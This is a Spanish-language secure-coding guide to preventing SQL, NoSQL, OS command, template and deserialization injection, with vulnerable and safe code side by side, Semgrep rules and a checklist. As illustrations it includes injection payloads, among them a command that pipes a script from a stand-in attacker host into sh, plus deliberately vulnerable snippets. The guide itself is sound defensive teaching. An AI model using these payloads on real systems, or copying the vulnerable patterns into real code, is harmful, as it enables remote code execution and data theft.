# Inyecciones: SQLi, Command Injection y RCE

| Campo | Valor |
|---|---|
| Dominio | Código y prevención de vulnerabilidades |
| Aplica a | Toda capa que construya consultas, comandos, plantillas, expresiones o deserialice datos |
| Referencias | OWASP Top 10:2025 A05 (Injection), A08 (Software or Data Integrity Failures); OWASP ASVS 5.0 V1 (Encoding and Sanitization) y V2 (Validation and Business Logic); CWE-89, CWE-78, CWE-77, CWE-94, CWE-95, CWE-502, CWE-917, CWE-1336 |
| Severidad típica | Crítica (CVSS 9.0–10.0 cuando hay ejecución remota o volcado de base de datos) |

---

## 1. Principio de Seguridad

**Qué se mitiga:** la mezcla de *datos* controlados por un actor externo con *código* que un intérprete ejecuta (motor SQL, shell del sistema operativo, intérprete de Python/JS, motor de plantillas, parser LDAP/XPath, deserializador).

**Mecánica del fallo:** una inyección existe cuando la aplicación construye una instrucción para un intérprete concatenando entrada externa. El intérprete no puede distinguir qué fragmento escribió el desarrollador y cuál el atacante, por lo que los metacaracteres del lenguaje (`'`, `;`, `--`, `|`, `$()`, `{{ }}`, `__reduce__`) cambian la semántica de la instrucción.

**Por qué importa:** el impacto va desde la lectura completa de la base de datos (SQLi) hasta la ejecución arbitraria de código con los privilegios del proceso (Command Injection, RCE por `eval`, SSTI o deserialización insegura), que a menudo es el primer paso para el movimiento lateral en la red interna.

**Regla rectora:** *separar estructuralmente código y datos*. El control primario nunca es "limpiar" la entrada, sino usar APIs que pasen los datos por un canal distinto al del código (parámetros enlazados, `argv` en forma de lista, serializadores de solo datos). La validación de entrada es un control de defensa en profundidad, no el control principal.

### Jerarquía de controles (en orden de preferencia)

1. **Eliminar el intérprete:** usar una API nativa en vez de invocar un comando o evaluar una expresión (p. ej., `shutil.copy` en lugar de `cp`).
2. **API parametrizada:** prepared statements, ORM con parámetros enlazados, `subprocess.run([...])` sin shell.
3. **Lista blanca (allow-list):** para lo que no se puede parametrizar (nombres de columna, dirección de ordenamiento, nombre de tabla).
4. **Validación estricta de tipo, formato y longitud** en la frontera de confianza (Pydantic, Zod, JSON Schema).
5. **Mínimo privilegio en el runtime:** usuario de base de datos sin DDL, contenedor sin root y sistema de archivos de solo lectura, para limitar el radio de impacto si los controles anteriores fallan.

---

## 2. Inyección SQL (SQLi) — CWE-89

### 2.1 Python (DB-API / psycopg)

**Patrón Vulnerable (Qué NO hacer)**

```python
# VULNERABLE: f-string concatena la entrada directamente en el SQL.
# Payload: email = "' OR '1'='1' -- "  -> devuelve todos los usuarios.
def get_user(conn, email: str):
    cur = conn.cursor()
    cur.execute(f"SELECT id, email, role FROM users WHERE email = '{email}'")
    return cur.fetchone()

# VULNERABLE: "escapar a mano" con replace() no es una defensa.
# Falla con codificaciones multibyte, backslashes y contextos numéricos.
query = "SELECT * FROM orders WHERE id = " + request.args["id"].replace("'", "''")
```

**Patrón Seguro (Qué SÍ hacer)**

```python
import psycopg

def get_user(conn: psycopg.Connection, email: str):
    # Placeholder %s: el driver envía el valor por un canal separado (protocolo extendido).
    # NOTA: %s aquí NO es formateo de strings de Python; nunca uses el operador %.
    with conn.cursor() as cur:
        cur.execute(
            "SELECT id, email, role FROM users WHERE email = %s",
            (email,),
        )
        return cur.fetchone()
```

### 2.2 Python (SQLAlchemy 2.x)

**Patrón Vulnerable (Qué NO hacer)**

```python
from sqlalchemy import text

# VULNERABLE: text() con f-string anula la protección del ORM.
stmt = text(f"SELECT * FROM products WHERE name LIKE '%{term}%'")
session.execute(stmt)

# VULNERABLE: order_by con string arbitrario del usuario.
session.query(Product).order_by(text(request.args["sort"]))
```

**Patrón Seguro (Qué SÍ hacer)**

```python
from sqlalchemy import select, text
from models import Product

# 1) Construcción declarativa: el ORM enlaza parámetros automáticamente.
stmt = select(Product).where(Product.name.ilike(f"%{term}%"))  # term viaja como bind param
rows = session.scalars(stmt).all()

# 2) SQL crudo inevitable: parámetros nombrados con bindparams.
stmt = text("SELECT * FROM products WHERE name ILIKE :pattern").bindparams(pattern=f"%{term}%")

# 3) Identificadores (columna/dirección): allow-list, NUNCA parámetro libre.
SORTABLE = {"name": Product.name, "price": Product.price, "created": Product.created_at}

def build_order(sort: str, direction: str):
    column = SORTABLE.get(sort)
    if column is None:
        raise ValueError("Campo de ordenamiento no permitido")
    return column.desc() if direction == "desc" else column.asc()

stmt = select(Product).order_by(build_order(sort, direction))
```

### 2.3 TypeScript / Node.js (pg, Prisma)

**Patrón Vulnerable (Qué NO hacer)**

```typescript
// VULNERABLE: template literal concatenado en node-postgres.
const { rows } = await pool.query(
  `SELECT * FROM invoices WHERE customer_id = ${req.query.customerId}`
);

// VULNERABLE: Prisma $queryRawUnsafe con interpolación.
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`);
```

**Patrón Seguro (Qué SÍ hacer)**

```typescript
import { Pool } from "pg";
import { PrismaClient, Prisma } from "@prisma/client";

const pool = new Pool();
const prisma = new PrismaClient();

// node-postgres: placeholders posicionales $1, $2...
export async function getInvoices(customerId: string) {
  const { rows } = await pool.query(
    "SELECT id, total, status FROM invoices WHERE customer_id = $1",
    [customerId],
  );
  return rows;
}

// Prisma: $queryRaw con tagged template => parametriza automáticamente.
export async function findByName(name: string) {
  return prisma.$queryRaw`SELECT id, name FROM users WHERE name = ${name}`;
}

// Composición segura de fragmentos dinámicos.
export async function search(filters: { status?: string }) {
  const where = filters.status
    ? Prisma.sql`WHERE status = ${filters.status}`
    : Prisma.empty;
  return prisma.$queryRaw`SELECT * FROM orders ${where}`;
}
```

### 2.4 SQL en el servidor (procedimientos almacenados)

Un procedimiento almacenado **no es seguro por definición**: si arma SQL dinámico internamente, la inyección se traslada a la base de datos.

**Patrón Vulnerable (Qué NO hacer)**

```sql
-- PostgreSQL: EXECUTE con concatenación dentro de PL/pgSQL.
CREATE OR REPLACE FUNCTION find_user(p_name text) RETURNS SETOF users AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE name = ''' || p_name || '''';
END;
$$ LANGUAGE plpgsql;
```

**Patrón Seguro (Qué SÍ hacer)**

```sql
-- EXECUTE ... USING enlaza el valor; format(%I) cita identificadores de forma segura.
CREATE OR REPLACE FUNCTION find_user(p_name text) RETURNS SETOF users AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE name = $1' USING p_name;
END;
$$ LANGUAGE plpgsql SECURITY INVOKER;

-- Identificador dinámico (solo si proviene de una allow-list en la aplicación):
-- EXECUTE format('SELECT count(*) FROM %I', p_table);

-- Mínimo privilegio del usuario de aplicación:
REVOKE ALL ON SCHEMA public FROM app_user;
GRANT USAGE ON SCHEMA public TO app_user;
GRANT SELECT, INSERT, UPDATE ON users, orders TO app_user;  -- sin DROP/ALTER/TRUNCATE
ALTER ROLE app_user SET statement_timeout = '5s';           -- limita SQLi basada en tiempo/DoS
```

### 2.5 NoSQL Injection (MongoDB)

**Patrón Vulnerable (Qué NO hacer)**

```javascript
// VULNERABLE: el body JSON permite operadores. Payload: {"user":"admin","pass":{"$ne":null}}
const user = await db.collection("users").findOne({
  user: req.body.user,
  pass: req.body.pass,
});
```

**Patrón Seguro (Qué SÍ hacer)**

```typescript
import { z } from "zod";

// Forzar tipos primitivos: un objeto {"$ne": null} es rechazado.
const LoginSchema = z.object({
  user: z.string().min(3).max(64).regex(/^[a-zA-Z0-9._-]+$/),
  pass: z.string().min(12).max(256),
}).strict();

const { user, pass } = LoginSchema.parse(req.body);
const doc = await db.collection("users").findOne({ user: { $eq: user } });
// La verificación de la contraseña se hace con Argon2id sobre el hash, nunca en la query.
```

> En Mongoose, active `mongoose.set('sanitizeFilter', true)` como defensa adicional y no use `$where` ni `$function` con entrada externa.

---

## 3. Command Injection (OS) — CWE-78 / CWE-77

**Mecánica:** cuando el proceso invoca `/bin/sh -c "<cadena>"`, el shell interpreta `;`, `&&`, `|`, `` ` ``, `$()`, `>`, `*` y saltos de línea. Basta un nombre de archivo como `x; curl attacker/s.sh | sh` para lograr RCE.

### 3.1 Python

**Patrón Vulnerable (Qué NO hacer)**

```python
import os, subprocess

host = request.args["host"]

os.system(f"ping -c 1 {host}")                                   # PROHIBIDO
subprocess.run(f"nslookup {host}", shell=True)                   # PROHIBIDO: shell=True
subprocess.Popen("tar -czf backup.tgz " + path, shell=True)      # PROHIBIDO
os.popen(f"convert {filename} out.png").read()                   # PROHIBIDO

# Falso arreglo: shlex.quote mitiga el shell, pero NO la inyección de argumentos (ver 3.2).
subprocess.run(f"git clone {shlex.quote(repo)}", shell=True)
```

**Patrón Seguro (Qué SÍ hacer)**

```python
import ipaddress
import shutil
import subprocess
from pathlib import Path

PING = shutil.which("ping")  # Ruta absoluta resuelta una sola vez; evita secuestro de PATH.

def ping_host(raw: str) -> str:
    # 1) Validación estricta: solo IPs válidas (rechaza nombres, flags y metacaracteres).
    ip = ipaddress.ip_address(raw.strip())
    # 2) argv como lista, sin shell. El valor es SIEMPRE un único argumento.
    result = subprocess.run(
        [PING, "-c", "1", "-W", "2", str(ip)],
        capture_output=True,
        text=True,
        timeout=5,          # evita cuelgues
        check=False,
        env={"PATH": "/usr/bin:/bin"},  # entorno mínimo y controlado
    )
    return result.stdout

# Mejor aún: eliminar el comando externo y usar una API nativa.
def backup(src: Path, dst: Path) -> None:
    shutil.make_archive(str(dst), "gztar", root_dir=src)
```

### 3.2 Inyección de argumentos (Argument Injection) — CWE-88

Aun sin shell, un valor que comienza con `-` puede interpretarse como una opción (`--upload-pack=...` en git, `-oProxyCommand=...` en ssh, `--checkpoint-action=exec=...` en tar).

```python
# SEGURO: validar formato y usar "--" para cerrar el parsing de opciones.
import re
REPO_RE = re.compile(r"^https://git\.empresa\.local/[\w.-]+/[\w.-]+\.git$")

def clone(repo: str, dest: Path) -> None:
    if not REPO_RE.fullmatch(repo):
        raise ValueError("Repositorio no permitido")
    subprocess.run(["/usr/bin/git", "clone", "--depth=1", "--", repo, str(dest)],
                   check=True, timeout=120)
```

### 3.3 Node.js

**Patrón Vulnerable (Qué NO hacer)**

```javascript
const { exec } = require("child_process");
// VULNERABLE: exec() siempre invoca un shell.
exec(`ffmpeg -i uploads/${req.body.file} out.mp4`, cb);

// VULNERABLE: spawn con shell:true equivale a exec.
spawn("ls " + dir, { shell: true });
```

**Patrón Seguro (Qué SÍ hacer)**

```typescript
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import path from "node:path";

const execFileAsync = promisify(execFile);
const UPLOAD_DIR = "/srv/app/uploads";
const SAFE_NAME = /^[a-f0-9]{32}\.(mp4|mov)$/; // nombres generados por el servidor (UUID/hash)

export async function transcode(fileName: string) {
  if (!SAFE_NAME.test(fileName)) throw new Error("Nombre de archivo inválido");
  const input = path.join(UPLOAD_DIR, fileName);
  if (!input.startsWith(UPLOAD_DIR + path.sep)) throw new Error("Path traversal");
  await execFileAsync("/usr/bin/ffmpeg", ["-nostdin", "-i", input, "-y", `${input}.out.mp4`], {
    timeout: 60_000,
    shell: false,
  });
}
```

---

## 4. Ejecución de código dinámico (RCE) — CWE-94 / CWE-95

### 4.1 Prohibición de `eval()`, `exec()`, `compile()`, `new Function()`

**Patrón Vulnerable (Qué NO hacer)**

```python
# VULNERABLE: "calculadora" con eval. Payload: __import__('os').system('id')
result = eval(request.json["expression"])

# VULNERABLE: exec para "plugins" o configuración dinámica.
exec(open(user_supplied_path).read())

# VULNERABLE: getattr dinámico sobre un módulo/objeto con nombre controlado por usuario.
handler = getattr(actions_module, request.args["action"])
```

```javascript
// VULNERABLE en JS/TS
eval(req.query.code);
new Function("return " + userInput)();
setTimeout(userString, 100);              // con string = eval implícito
vm.runInNewContext(userCode);             // node:vm NO es un sandbox de seguridad
```

**Patrón Seguro (Qué SÍ hacer)**

```python
import ast
import operator as op

# 1) Literales: ast.literal_eval solo acepta str, números, tuplas, listas, dicts, bool, None.
config_value = ast.literal_eval(raw_value)

# 2) Expresiones aritméticas: evaluador AST con allow-list de nodos.
_OPS = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv, ast.USub: op.neg}

def safe_eval(expr: str) -> float:
    if len(expr) > 200:
        raise ValueError("Expresión demasiado larga")
    def _eval(node):
        if isinstance(node, ast.Expression):
            return _eval(node.body)
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        if isinstance(node, ast.BinOp) and type(node.op) in _OPS:
            return _OPS[type(node.op)](_eval(node.left), _eval(node.right))
        if isinstance(node, ast.UnaryOp) and type(node.op) in _OPS:
            return _OPS[type(node.op)](_eval(node.operand))
        raise ValueError(f"Nodo no permitido: {type(node).__name__}")
    return _eval(ast.parse(expr, mode="eval"))

# 3) Despacho dinámico: diccionario explícito en lugar de getattr.
ACTIONS = {"export": export_report, "archive": archive_report}
handler = ACTIONS.get(request.args["action"])
if handler is None:
    abort(400)
```

> Si el negocio exige ejecutar código de terceros (reglas, scripts de usuario), hágalo en un sandbox de aislamiento real: WebAssembly (Wasmtime) con capacidades mínimas, gVisor/Firecracker, o un contenedor efímero sin red, con límites de CPU, memoria y tiempo. `node:vm`, `vm2` (descontinuado y con escapes conocidos) y los `RestrictedPython` mal configurados **no** son fronteras de seguridad.

### 4.2 Server-Side Template Injection (SSTI) — CWE-1336

**Patrón Vulnerable (Qué NO hacer)**

```python
from flask import render_template_string
# VULNERABLE: la entrada se vuelve PARTE de la plantilla.
# Payload: {{ cycler.__init__.__globals__.os.popen('id').read() }}
return render_template_string(f"<h1>Hola {request.args['name']}</h1>")
```

**Patrón Seguro (Qué SÍ hacer)**

```python
from flask import render_template_string
from jinja2.sandbox import ImmutableSandboxedEnvironment

# 1) La entrada va como VARIABLE de contexto, nunca como fuente de la plantilla.
return render_template_string("<h1>Hola {{ name }}</h1>", name=request.args.get("name", ""))

# 2) Si usuarios autorizados editan plantillas (p. ej., correos), usar sandbox inmutable.
env = ImmutableSandboxedEnvironment(autoescape=True)
tpl = env.from_string(admin_template)  # aun así: restringir quién puede editar y auditar cambios
```

---

## 5. Deserialización insegura — CWE-502

**Mecánica:** formatos que serializan *objetos* (no solo datos) permiten que el deserializador invoque constructores o métodos mágicos (`__reduce__` en `pickle`, *gadget chains* en Java/.NET, etiquetas `!!python/object` en YAML). Deserializar datos no confiables equivale a ejecutar código no confiable.

**Patrón Vulnerable (Qué NO hacer)**

```python
import pickle, yaml, base64

# VULNERABLE: cookie/session/cola con pickle.
session = pickle.loads(base64.b64decode(request.cookies["session"]))

# VULNERABLE: yaml.load sin Loader seguro (o con yaml.Loader / UnsafeLoader).
config = yaml.load(uploaded_file.read(), Loader=yaml.Loader)

# VULNERABLE: torch.load / joblib.load de modelos descargados de fuentes no confiables (pickle).
model = torch.load("modelo_descargado.pt")
```

```javascript
// VULNERABLE: node-serialize / funcster (una IIFE en el payload se ejecuta al deserializar).
const serialize = require("node-serialize");
serialize.unserialize(req.cookies.profile);
```

**Patrón Seguro (Qué SÍ hacer)**

```python
import json
import yaml
from pydantic import BaseModel, Field

class Profile(BaseModel):
    model_config = {"extra": "forbid"}
    user_id: int = Field(gt=0)
    theme: str = Field(pattern=r"^(light|dark)$")

# 1) Formato de solo datos + validación de esquema.
profile = Profile.model_validate_json(raw_body)

# 2) YAML: safe_load (solo tipos primitivos).
config = yaml.safe_load(stream)

# 3) Si necesita integridad sobre datos serializados (p. ej., estado en el cliente),
#    firme con HMAC o use un token firmado (itsdangerous / JWT firmado) y valide ANTES de parsear.
from itsdangerous import URLSafeTimedSerializer
signer = URLSafeTimedSerializer(secret_key=SECRET, salt="profile-v1")
data = signer.loads(token, max_age=3600)  # lanza excepción si la firma o la edad no son válidas

# 4) Modelos de ML: preferir safetensors; torch.load con weights_only=True.
model_state = torch.load("modelo.pt", weights_only=True)
```

> Java: no use `ObjectInputStream` con datos externos; si es inevitable, aplique `ObjectInputFilter` (JEP 290) con allow-list de clases. .NET: `BinaryFormatter` está obsoleto y deshabilitado por defecto en .NET 8+; use `System.Text.Json`.

---

## 6. Otras inyecciones frecuentes

| Tipo | CWE | Control primario |
|---|---|---|
| LDAP Injection | CWE-90 | Escapar con la función del SDK (`ldap3.utils.conv.escape_filter_chars`) y usar binds parametrizados. |
| XPath/XQuery | CWE-643 | Variables XPath precompiladas; nunca concatenar. |
| XXE (XML External Entities) | CWE-611 | `defusedxml` en Python; deshabilitar DTD y entidades externas en todos los parsers. |
| Header / CRLF Injection | CWE-113 | Rechazar `\r` y `\n` en valores de cabeceras; usar las APIs del framework. |
| Log Injection | CWE-117 | Logging estructurado (JSON) y codificación de saltos de línea. |
| Path Traversal | CWE-22 | Resolver la ruta canónica (`Path.resolve()`) y verificar que esté dentro del directorio base; nombres generados por el servidor. |
| Expression Language / OGNL | CWE-917 | Nunca evaluar EL con entrada externa; actualizar frameworks (Struts, Spring). |

**Ejemplo: Path Traversal y XXE en Python**

```python
from pathlib import Path
from defusedxml.ElementTree import fromstring  # XXE-safe

BASE = Path("/srv/app/reports").resolve()

def read_report(name: str) -> bytes:
    target = (BASE / name).resolve()
    if not target.is_relative_to(BASE):   # Python 3.9+
        raise PermissionError("Ruta fuera del directorio permitido")
    return target.read_bytes()

tree = fromstring(xml_payload)  # rechaza entidades externas y bombas de expansión
```

---

## 7. Validación de entrada (defensa en profundidad)

La validación debe ser **positiva (allow-list)**, **en el servidor** y **en la frontera de confianza**. Debe validar el tipo, la longitud, el rango, el formato y el conjunto de caracteres. La "sanitización" que elimina caracteres peligrosos (deny-list) es frágil y no reemplaza a la parametrización.

```python
from pydantic import BaseModel, Field, field_validator
from typing import Literal

class SearchRequest(BaseModel):
    model_config = {"extra": "forbid", "str_strip_whitespace": True}
    term: str = Field(min_length=1, max_length=100)
    page: int = Field(default=1, ge=1, le=1000)
    sort: Literal["name", "price", "created"] = "created"
    direction: Literal["asc", "desc"] = "desc"

    @field_validator("term")
    @classmethod
    def no_control_chars(cls, v: str) -> str:
        if any(ord(c) < 32 for c in v):
            raise ValueError("Caracteres de control no permitidos")
        return v
```

---

## 8. Detección automatizada en el pipeline

```yaml
# .semgrep.yml (extracto) — reglas bloqueantes en PR
rules:
  - id: python-subprocess-shell-true
    languages: [python]
    severity: ERROR
    message: "subprocess con shell=True está prohibido (CWE-78)"
    pattern: subprocess.$FUNC(..., shell=True, ...)
  - id: python-eval-exec
    languages: [python]
    severity: ERROR
    message: "eval/exec prohibido (CWE-95)"
    pattern-either:
      - pattern: eval(...)
      - pattern: exec(...)
  - id: python-pickle-loads
    languages: [python]
    severity: ERROR
    message: "pickle con datos no confiables (CWE-502)"
    pattern-either:
      - pattern: pickle.loads(...)
      - pattern: pickle.load(...)
```

Herramientas recomendadas: **Semgrep** (reglas `p/owasp-top-ten`, `p/python`, `p/typescript`), **Bandit** (`B602`, `B307`, `B301`, `B506`, `B608`), **ESLint** con `eslint-plugin-security` y `no-eval`/`no-implied-eval`, **CodeQL** (consultas `security-extended`). En pruebas dinámicas: **sqlmap** y **Burp Suite** en entornos de QA autorizados.

```bash
bandit -r src/ -ll -ii -f json -o bandit.json
semgrep scan --config p/owasp-top-ten --config .semgrep.yml --error
```

---

## 9. Checklist de Verificación (antes de merge / deploy)

- [ ] No existe concatenación ni interpolación (`f""`, `+`, `${}`, `%`, `.format`) de entrada externa en sentencias SQL, NoSQL, LDAP o XPath.
- [ ] Todas las consultas usan parámetros enlazados (prepared statements u ORM). Las funciones `raw`/`Unsafe` están justificadas y revisadas.
- [ ] Los identificadores dinámicos (columnas, tablas, ordenamiento) pasan por una allow-list explícita.
- [ ] El usuario de base de datos de la aplicación no tiene privilegios DDL ni de superusuario, y tiene `statement_timeout` configurado.
- [ ] No hay `os.system`, `os.popen`, `subprocess(..., shell=True)`, `child_process.exec` ni `spawn({shell:true})`.
- [ ] Los comandos externos usan `argv` en forma de lista, ruta absoluta del binario, `--` antes de argumentos externos, timeout y entorno mínimo.
- [ ] No hay `eval`, `exec`, `compile`, `new Function`, `setTimeout(string)` ni `vm.run*` con datos externos.
- [ ] Las plantillas nunca se construyen con entrada del usuario (sin `render_template_string(f"...")`).
- [ ] No se deserializa con `pickle`, `yaml.load` inseguro, `node-serialize`, `ObjectInputStream` o `BinaryFormatter` sobre datos no confiables. Los modelos de ML usan `safetensors` o `weights_only=True`.
- [ ] Los parsers XML deshabilitan DTD y entidades externas (`defusedxml`).
- [ ] Las rutas de archivo se canonicalizan y se validan contra un directorio base.
- [ ] Todos los endpoints validan la entrada con un esquema estricto (`extra=forbid` / `.strict()`), con límites de longitud y tipos primitivos.
- [ ] Semgrep, Bandit y ESLint security pasan sin hallazgos de severidad alta, y las excepciones están documentadas con su justificación.
- [ ] Existen pruebas unitarias negativas con payloads de inyección (`' OR 1=1--`, `; id`, `{{7*7}}`, `{"$ne":null}`).

---

## 10. Referencias

- OWASP Top 10:2025 — A05 Injection: https://owasp.org/Top10/2025/
- OWASP ASVS 5.0 — V1 Encoding and Sanitization (V1.2 Injection Prevention, V1.5 Safe Deserialization): https://github.com/OWASP/ASVS
- OWASP Cheat Sheets: SQL Injection Prevention, OS Command Injection Defense, Deserialization, Query Parameterization: https://cheatsheetseries.owasp.org/
- MITRE CWE Top 25 (2025): https://cwe.mitre.org/top25/
